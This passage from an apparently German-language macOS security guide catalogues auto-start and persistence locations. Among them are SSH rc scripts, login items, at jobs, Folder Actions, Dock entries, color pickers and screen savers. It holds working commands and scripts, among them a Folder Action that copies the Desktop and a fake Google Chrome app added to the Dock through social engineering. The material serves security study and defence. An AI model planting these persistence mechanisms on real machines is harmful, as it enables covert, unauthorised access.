- **`/etc/ssh/sshrc`**
  - Root-Rechte erforderlich
  - **Auslöser**: Anmeldung via SSH

> [!CAUTION]
> Zum Aktivieren von SSH ist Full Disk Access erforderlich:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Beschreibung & Ausnutzung

Standardmäßig werden die Skripte **`/etc/ssh/sshrc`** und **`~/.ssh/rc`** ausgeführt, wenn sich ein Benutzer **per SSH anmeldet**, sofern in `/etc/ssh/sshd_config` nicht `PermitUserRC no` gesetzt ist.<sup>[[14]](#references)</sup>

### **Anmeldeobjekte**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Dafür musst du `osascript` mit Argumenten ausführen
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherorte

- **Registrierte Login-Item-Hilfs-App:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (üblicher gebündelter Speicherort).
  - **Auslöser:** Die Registrierung kann die Hilfs-App sofort starten; bei späteren Benutzeranmeldungen wird sie dann ebenfalls gestartet, vorbehaltlich der Genehmigung.
- **Registrierter gebündelter Agent/Daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` oder `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Auslöser:** Ein genehmigter Agent kann bei der Registrierung und bei späteren Anmeldungen starten; ein genehmigter Daemon startet beim Systemstart. Für einen Daemon ist eine Admin-Genehmigung erforderlich.

#### Beschreibung

Unter **Systemeinstellungen → Allgemein → Anmeldeobjekte & Erweiterungen** können Benutzer Anmeldeobjekte und Hintergrundobjekte überprüfen. macOS 13 und spätere Versionen bieten [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice), um gebündelte Anmeldeobjekte, Launch-Agents und Launch-Daemons zu registrieren. Das Verhalten von [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) unterscheidet sich je nach Typ und Genehmigungsstatus. **Eine Hilfs-App in ein App-Bundle zu schreiben, reicht nicht aus, um ein neues Anmeldeobjekt zu registrieren.** Wenn dagegen eine bereits registrierte ausführbare Hilfsdatei beschreibbar ist, kann eine Änderung dieser Datei ihren nächsten Start beeinflussen, ohne dass eine erneute Registrierung erforderlich ist. Überprüfe vorher den tatsächlichen Pfad und die Code-Signaturprüfungen.

Die folgende Methode dient nur zum Lesen und sucht auf einem Mac nach gebündelten Hilfs-Apps; sie registriert oder startet keine davon:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Bei einer gebündelten Launch-plist muss `BundleProgram` **relativ zum Stammverzeichnis des App-Bundles** aufgelöst werden (zum Beispiel `Contents/MacOS/Helper`), wie in [Apples Anleitung zur Migration von Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) beschrieben. Eine schreibgeschützte Bestandsaufnahme von `/Applications` auf dem Forschungs-Mac ergab 14 gebündelte Helper-Einträge und fünf `BundleProgram`-Deklarationen; alle fünf Ziele ließen sich auflösen, und bei zwei bestand die Prüfung auf Schreibrechte des Benutzers. Diese Prüfung belegt **nicht**, dass einer der beiden Helper registriert oder aktiviert ist, nach der Signaturprüfung ausführbar ist oder eine Sandbox erreichen kann. `sfltool dumpbtm` listete auf diesem Mac 150 benannte Einträge auf; das ist ein Hilfsmittel zur Untersuchung und kein Test dafür, ob jeder Eintrag ausgeführt wird.

Ältere Login-Items lassen sich auch über Apple events verwalten. Sie können über die Befehlszeile aufgelistet, hinzugefügt und entfernt werden. Das Hinzufügen ändert jedoch die dauerhafte Login-Konfiguration des Benutzers und erfordert möglicherweise eine Automation-Genehmigung:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` ist ein Implementierungsdetail und kein unterstützter Ort, um einfach durch Schreiben einer Datei eine Payload zu installieren. Die ältere API `SMLoginItemSetEnabled` wurde für neue Helper durch `SMAppService` abgelöst; der frühere Pfad `/var/db/com.apple.xpc.launchd/loginitems.501.plist` auf dieser Seite war auf dem Testsystem mit macOS 26.5.2 nicht vorhanden. Verwende bei der Bewertung moderner Login-Elemente die Registrierungs-API und den Systemstatus der Benutzeroberfläche, statt einen bestimmten Datenbankpfad anzunehmen.

### ZIP als Login-Element

(Siehe den vorherigen Abschnitt zu Login-Elementen; dies ist eine Erweiterung.)

Wenn du eine **ZIP**-Datei als **Login-Element** speicherst, öffnet **`Archive Utility`** sie. Wenn die ZIP-Datei beispielsweise in `~/Library` gespeichert ist und den Ordner **`LaunchAgents/file.plist`** mit einer Backdoor enthält, wird dieser Ordner erstellt (standardmäßig ist er nicht vorhanden) und die plist hinzugefügt. Wenn sich der Benutzer das nächste Mal anmeldet, wird die in der plist angegebene **Backdoor ausgeführt**.

Eine weitere Möglichkeit wäre, die Dateien **`.bash_profile`** und **`.zshenv`** im Benutzerverzeichnis zu erstellen. So funktioniert diese Technik auch dann, wenn der Ordner `LaunchAgents` bereits existiert.

### At

Write-up: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Du musst jedoch **`at`** **ausführen**, und es muss **aktiviert** sein.
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`at`** muss **ausgeführt** werden und **aktiviert** sein.

#### **Beschreibung**

`at`-Aufgaben sind dafür vorgesehen, **einmalige Aufgaben zu bestimmten Zeiten zu planen**. Im Gegensatz zu cron-Jobs werden `at`-Aufgaben nach der Ausführung automatisch entfernt. Wichtig ist, dass diese Aufgaben Systemneustarts überdauern und unter bestimmten Bedingungen ein Sicherheitsrisiko darstellen können.<sup>[[16]](#references)</sup>

Die mitgelieferte `com.apple.atrun.plist` enthält `Disabled = true`, aber launchd speichert wirksame Aktivierungs-/Deaktivierungsüberschreibungen separat. Auf dem Testsystem mit macOS 26.5.2 meldete `launchctl print-disabled system` `com.apple.atrun` als **aktiviert**, obwohl dieser Schlüssel in der mitgelieferten Datei gesetzt war. Prüfe den tatsächlichen Status, bevor du behauptest, dass `at`-Jobs ausgeführt werden:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Ein Administrator kann einen deaktivierten `atrun`-Dienst mit `launchctl` aktivieren; das folgende historische Beispiel ändert den Status eines Systemdienstes und wurde **nicht** auf dem Forschungs-Mac ausgeführt:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Dies wird in 1 Stunde eine Datei erstellen:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Prüfe die Jobwarteschlange mit `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Oben sehen wir zwei geplante Jobs. Mit `at -c JOBNUMBER` können wir die Details des Jobs anzeigen.

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Wenn AT tasks nicht aktiviert sind, werden die erstellten Tasks nicht ausgeführt.

Die **Job-Dateien** befinden sich unter `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Der Dateiname enthält die Warteschlange, die Jobnummer und den geplanten Ausführungszeitpunkt. Betrachten wir zum Beispiel `a0001a019bdcd2`.

- `a` – dies ist die Warteschlange
- `0001a` – Jobnummer in Hexadezimaldarstellung, `0x1a = 26`
- `019bdcd2` – Zeit in Hexadezimaldarstellung. Sie steht für die seit der Epoche vergangenen Minuten. `0x019bdcd2` entspricht `26991826` im Dezimalsystem. Multiplizieren wir diesen Wert mit 60, erhalten wir `1619509560`, was `GMT: Dienstag, 27. April 2021, 7:46:00` entspricht.

Wenn wir die Jobdatei ausgeben, sehen wir, dass sie dieselben Informationen enthält, die wir mit `at -c` erhalten haben.

### Kalenderalarme zum Öffnen von Dateien

- **Schreibziel:** Ein ausführbares App-Bundle oder eine andere Datei, die bereits von einem benutzerdefinierten Kalenderalarm **Datei öffnen** ausgewählt wurde. Zum Erstellen oder Bearbeiten des Alarms selbst ist Zugriff auf das Kalenderereignis über Calendar oder eine autorisierte Kalenderdatenquelle erforderlich; das Schreiben einer beliebigen Datei erstellt keinen Alarm.
- **Auslöser:** Der geplante Zeitpunkt des Alarms auf einem Mac, auf dem Calendar das Ereignis verarbeitet. Ein wiederkehrendes Ereignis kann die Aktion wiederholen. [Apples aktuelle Calendar-Anleitung](https://support.apple.com/guide/calendar/icl1012/mac) bestätigt die Alarmoption **Benutzerdefiniert → Datei öffnen** in macOS 26.
- **Ausführungsidentität und Voraussetzungen:** Calendar öffnet die ausgewählte Datei für den angemeldeten Benutzer mit der zugehörigen Anwendung. Beim Starten eines App-Bundles kann dessen Code als dieser Benutzer ausgeführt werden, vorbehaltlich Gatekeeper, Quarantäne und anderer macOS-Prüfungen. Eine einfache Skriptdatei wird möglicherweise nur in einem Editor geöffnet; ihre Dateiendung allein belegt keine Codeausführung.

Um einen möglichen Kandidaten sicher zu überprüfen, untersuchen Sie den Alarm des Ereignisses in Calendar und die Berechtigungen der ausgewählten Datei. Dieser Pfad wurde anhand von Apples Anleitung dokumentiert und **nicht** auf dem Forschungs-Mac ausgeführt, da ein Test einen aktiven Kalender ändern und auf ein Desktop-Ereignis warten würde. In einem Wegwerfaccount kann ein Test ein App-Bundle mit reinem Marker auswählen, einen zeitnahen Alarm zum Öffnen der Datei festlegen, den Start bestätigen und anschließend das Ereignis und die App löschen.

### Shortcuts-Automationen unter macOS

- **Schreibziel:** Eine ausführbare Datei, auf die bereits in einer Aktion eines Shortcuts verwiesen wird, oder ein vorhandener Shortcut, den ein autorisierter Benutzer bearbeiten kann. Eine beliebige `.shortcut`-Datei oder ein Schreibzugriff auf eine nicht dokumentierte Shortcuts-Datenbank ist keine unterstützte Methode zur Registrierung einer Automation.
- **Auslöser und Identität:** Ein zuvor konfiguriertes, aktiviertes Automationsereignis, etwa eine Uhrzeit oder ein App-Ereignis, ruft den Shortcut für den angemeldeten Benutzer auf. [Apples aktuelle Anleitung zu Mac-Automationen](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) führt unterstützte Ereignisse auf, erklärt, wann eine Automation ohne Nachfrage ausgeführt werden kann, und beschreibt das Entfernen eines Auslösers. [Apples Datenschutzanleitung zu Shortcuts](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) verlangt für Skriptaktionen die Option **Skriptausführung erlauben**; einzelne Aktionen können weiterhin Berechtigungen anfordern.

Dies ist ein bedingter Pfad von Schreibzugriff zu Ausführung, **nur wenn die vorhandene Aktion ein beschreibbares Ziel lädt**. Das Erstellen einer neuen Automation über die Benutzeroberfläche ändert aktive Einstellungen und wurde auf dem Forschungs-Mac nicht versucht. In einem Wegwerfaccount kann ein Benutzer einen zeitgesteuerten Shortcut konfigurieren, dessen Skript `/tmp/ht-shortcuts-marker` berührt, die erforderlichen Berechtigungen aktivieren, nach dem Ereignis das Vorhandensein des Markers bestätigen und anschließend die Automation, den Shortcut und den Marker löschen.

### Automator-Aktionen und Quick Actions

- **Schreibziele:** `~/Library/Automator/*.action` (Benutzer) und `/Library/Automator/*.action` (Administrator) für Aktions-Bundles. Ein gespeicherter Quick-Action-Workflow liegt üblicherweise unter `~/Library/Services/*.workflow`; prüfen Sie den tatsächlich vom Benutzer ausgewählten Workflow-Pfad. [Apples Referenz zum Automator-Framework](https://developer.apple.com/documentation/automator) führt die Verzeichnisse auf, in denen nach Aktionen gesucht wird.
- **Auslöser:** Automator lädt verfügbare Aktions-Bundles beim Start; die Aufgabe einer Aktion wird jedoch ausgeführt, wenn ein Workflow gestartet wird, der sie verwendet. Eine Quick Action wird ausgeführt, wenn der Benutzer sie im Finder, unter „Dienste“ oder über ein anderes angezeigtes Menü auswählt. Ein Folder-Action-Workflow wird ausgelöst, wenn Elemente zu seinem **bereits verknüpften** Ordner hinzugefügt werden; ein Calendar-Alarm-Workflow wird zum Ereigniszeitpunkt ausgeführt. [Apples Workflow-Typen](https://support.apple.com/guide/automator/aut7cac58839/mac) unterscheiden diese Ereignisse. Das bloße Schreiben einer Aktion oder eines Workflows verknüpft keinen Ordner und plant kein Kalenderereignis.
- **Ausführungsidentität und Voraussetzungen:** Das Konto, unter dem der Workflow läuft; Automator oder die aufrufende App muss die Aktion laden können und alle aktuellen Code-Signing- und Datenschutzprüfungen müssen sie zulassen. Ein beschreibbares Aktions-Bundle, auf das bereits ein aktiver Workflow verweist, ist ein anderer Fall als die Installation einer neuen Aktion und das Warten auf ihre Auswahl.

Die Benutzerverzeichnisse `Automator` und `Services` waren auf dem Test-Mac mit macOS 26.5.2 vorhanden; `/Library/Automator` fehlte. Es wurde kein aktiver Workflow erstellt, verknüpft oder ausgeführt. Verwenden Sie einen Wegwerfaccount und eine Aktion bzw. einen Workflow, der nur einen Marker setzt, um einen bestimmten Ladepfad zu überprüfen. Der separate Abschnitt [Folder Actions](#folder-actions) behandelt diese Ereignisquelle ausführlicher.

### Folder Actions

Bericht: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Bericht: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Sie müssen jedoch `osascript` mit Argumenten aufrufen können, um **`System Events`** zu kontaktieren und Folder Actions konfigurieren zu können
- TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
  - Es verfügt über einige grundlegende TCC-Berechtigungen, etwa für Desktop, Dokumente und Downloads

#### Speicherort

- **`/Library/Scripts/Folder Action Scripts`**
  - Root erforderlich
  - **Auslöser**: Zugriff auf den angegebenen Ordner
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Auslöser**: Zugriff auf den angegebenen Ordner

#### Beschreibung und Ausnutzung

Folder Actions sind Skripte, die automatisch durch Änderungen in einem Ordner ausgelöst werden, etwa durch das Hinzufügen oder Entfernen von Elementen oder durch andere Aktionen wie das Öffnen oder Ändern der Größe des Ordnerfensters. Diese Aktionen lassen sich für verschiedene Aufgaben nutzen und auf unterschiedliche Weise auslösen, etwa über die Finder-Benutzeroberfläche oder Terminalbefehle.<sup>[[17]](#references)[[18]](#references)</sup>

Zum Einrichten von Folder Actions haben Sie folgende Möglichkeiten:

1. Mit [Automator](https://support.apple.com/guide/automator/welcome/mac) einen Folder-Action-Workflow erstellen und als Dienst installieren.
2. Über „Folder Actions Setup“ im Kontextmenü eines Ordners manuell ein Skript zuweisen.
3. OSAScript verwenden, um Apple-Event-Nachrichten an `System Events.app` zu senden und eine Folder Action programmgesteuert einzurichten.
   - Diese Methode ist besonders nützlich, um die Aktion in das System einzubetten und so eine gewisse Persistenz zu erreichen.

Das folgende Skript zeigt ein Beispiel dafür, was durch eine Folder Action ausgeführt werden kann:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Damit das obige Skript mit Folder Actions verwendet werden kann, kompilieren Sie es mit:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Nachdem das Skript kompiliert wurde, richten Sie Folder Actions ein, indem Sie das folgende Skript ausführen. Dieses Skript aktiviert Folder Actions global und hängt das zuvor kompilierte Skript speziell an den Schreibtischordner an.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Führe das Setup-Skript mit folgendem Befehl aus:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- So implementieren Sie diese Persistenz über die GUI:

Dies ist das Skript, das ausgeführt wird:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Kompiliere es mit: `osacompile -l JavaScript -o folder.scpt source.js`

Verschiebe es nach:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Öffne dann die App `Folder Actions Setup`, wähle den **Ordner aus, den du überwachen möchtest**, und wähle in deinem Fall **`folder.scpt`** (in meinem Fall habe ich es output2.scp genannt):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Wenn du diesen Ordner nun mit **Finder** öffnest, wird dein Skript ausgeführt.

Diese Konfiguration wurde im **plist** unter **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** im Base64-Format gespeichert.

Versuchen wir nun, diese Persistenz ohne GUI-Zugriff einzurichten:

1. **Kopiere `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** nach `/tmp`, um eine Sicherungskopie anzulegen:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Entferne** die gerade eingerichteten Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Da wir jetzt eine leere Umgebung haben:

3. Kopiere die Sicherungsdatei: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Öffne `Folder Actions Setup.app`, um diese Konfiguration zu übernehmen: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Das hat bei mir nicht funktioniert, aber das sind die Anweisungen aus dem Writeup:(

### Dock-Verknüpfungen

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Dafür musst du aber eine schädliche Anwendung im System installiert haben
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `~/Library/Preferences/com.apple.dock.plist`
  - **Auslöser**: Wenn der Benutzer im Dock auf die App klickt

#### Beschreibung & Ausnutzung

Alle Anwendungen, die im Dock erscheinen, sind im plist **`~/Library/Preferences/com.apple.dock.plist`** angegeben.<sup>[[19]](#references)</sup>

Es ist möglich, **eine Anwendung hinzuzufügen** mit:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Mit etwas **social engineering** könntest du zum Beispiel Google Chrome im Dock imitieren und tatsächlich dein eigenes Skript ausführen:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Eingabemethoden

- **Schreibziel:** Ein Bundle einer Eingabemethoden-App mit ausführbarem Code, installiert in `~/Library/Input Methods/` (Benutzer) oder `/Library/Input Methods/` (Administrator). Dies unterscheidet sich von Apples reinen Textdateien für Tastaturbelegungen im Format `.inputplugin`, die für sich genommen keine beliebigen Code-Payloads sind.
- **Auslöser:** Der Benutzer fügt die Eingabequelle unter **Systemeinstellungen → Tastatur → Texteingabe** hinzu/aktiviert sie und wählt sie dann aus oder verwendet sie. Ein Bundle, das lediglich in das Verzeichnis kopiert wird, ist kein Beleg dafür, dass macOS es startet. [Apples aktuelle Anleitung zu Eingabequellen](https://support.apple.com/guide/mac-help/mchl84525d76/mac) beschreibt das Aktivieren und Wechseln von Eingabequellen; [Apples Dokumentation zu InputMethodKit](https://developer.apple.com/documentation/inputmethodkit) behandelt Eingabemethoden mit ausführbarem Code.
- **Ausführungsidentität und Beschränkungen:** Die Methode wird für den angemeldeten Benutzer ausgeführt und unterliegt der Registrierung von Eingabemethoden, der Codesignierung sowie den aktuellen macOS-Sicherheitsprüfungen. Für vorhandene aktivierte Methoden mit einer beschreibbaren ausführbaren Datei sind eine separate Pfad- und Signaturprüfung erforderlich.

Apples [älterer Hinweis zu Eingabemethoden von Drittanbietern](https://developer.apple.com/library/archive/qa/qa1810/_index.html) warnte bereits davor, dass das Kopieren bestimmter Palettenmethoden in diese Verzeichnisse nicht einmal dafür sorgt, dass sie unter „Eingabequellen“ erscheinen. Auf dem Forschungs-Mac mit macOS 26.5.2 ist das Benutzerverzeichnis vorhanden, aber es war kein Bundle installiert oder aktiviert. Es handelt sich daher um einen dokumentierten bedingten Pfad und nicht um ein lokales Laufzeitergebnis.

### Farbwähler

Write-up: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Eine sehr spezifische Aktion muss erfolgen
  - Sie landen in einer anderen Sandbox
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/Library/ColorPickers`
  - Root erforderlich
  - Auslöser: Farbwähler verwenden
- `~/Library/ColorPickers`
  - Auslöser: Farbwähler verwenden

#### Beschreibung & Exploit

**Kompilieren Sie ein Farbwähler**-Bundle mit Ihrem Code (Sie könnten beispielsweise [**dieses hier verwenden**](https://github.com/viktorstrate/color-picker-plus)), fügen Sie einen Konstruktor hinzu (wie im Abschnitt [Bildschirmschoner](macos-auto-start-locations.md#screen-saver)) und kopieren Sie das Bundle nach `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Wenn der Farbwähler dann ausgelöst wird, sollte Ihr Bundle ebenfalls ausgeführt werden.

Dies setzt voraus, dass eine kompatible App das Systemfarbfeld öffnet und den installierten Farbwähler auswählt. [Apples Anleitung zum Farbfeld](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) beschreibt die Speicherorte älterer Bundles. Eine lokale Pfadprüfung fand den älteren XPC-Dienst für Farbwähler, aber auf dem Forschungs-Mac war kein Farbwähler installiert oder geladen. Leiten Sie allein aus dem Pfad keine TCC-Umgehung ab.

Beachten Sie, dass die Binärdatei, die Ihre Bibliothek lädt, einer **sehr restriktiven Sandbox** unterliegt: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: **Nein, da Sie Ihre eigene App ausführen müssen**
- TCC-Bypass: Abhängig von der sandbox und den Berechtigungen der aktivierten Extension; kein allgemeiner Bypass bekannt.

#### Ort

- Eine bestimmte App

#### Beschreibung & Exploit

Ein Anwendungsbeispiel mit einer Finder Sync Extension [**finden Sie hier**](https://github.com/D00MFist/InSync).

Anwendungen können `Finder Sync Extensions` enthalten. Diese Extension wird in eine Anwendung eingebettet, die ausgeführt wird. Damit die Extension ihren Code ausführen kann, **muss sie außerdem** mit einem gültigen Apple-Entwicklerzertifikat **signiert** und **sandboxed** sein (wobei weniger strenge Ausnahmen hinzugefügt werden können). Außerdem muss sie mit etwas wie dem Folgenden registriert werden:<sup>[[21]](#references)[[22]](#references)</sup>

Eine installierte Extension muss außerdem **aktiviert** und für einen relevanten Finder-Speicherort oder ein relevantes Objekt aufgerufen werden; das Schreiben eines beliebigen `.appex`-Bundles reicht nicht aus. [Apples Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) stellt den Aktivierungsstatus bereit. Die folgenden `pluginkit`-Befehle veranschaulichen die explizite Registrierung und Aktivierung, nicht einen dateibasierten Auto-Start. Dieser Ansatz wurde anhand der Dokumentation geprüft; auf dem Forschungs-Mac wurde keine neue Extension installiert oder aktiviert.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Bildschirmschoner

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Allerdings landest du in einer gewöhnlichen application sandbox
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/System/Library/Screen Savers`
  - Root erforderlich
  - **Auslöser**: Bildschirmschoner auswählen
- `/Library/Screen Savers`
  - Root erforderlich
  - **Auslöser**: Bildschirmschoner auswählen
- `~/Library/Screen Savers`
  - **Auslöser**: Bildschirmschoner auswählen

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beschreibung & Exploit

Erstelle ein neues Projekt in Xcode und wähle die Vorlage zum Erstellen eines neuen **Bildschirmschoners** aus. Füge anschließend deinen Code hinzu, zum Beispiel den folgenden Code zum Erzeugen von Logs.<sup>[[23]](#references)[[24]](#references)</sup>

**Erstelle** das Build und kopiere das `.saver`-Bundle nach **`~/Library/Screen Savers`**. Öffne dann die Bildschirmschoner-GUI und klicke einfach darauf. Dadurch sollten viele Logs erzeugt werden:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
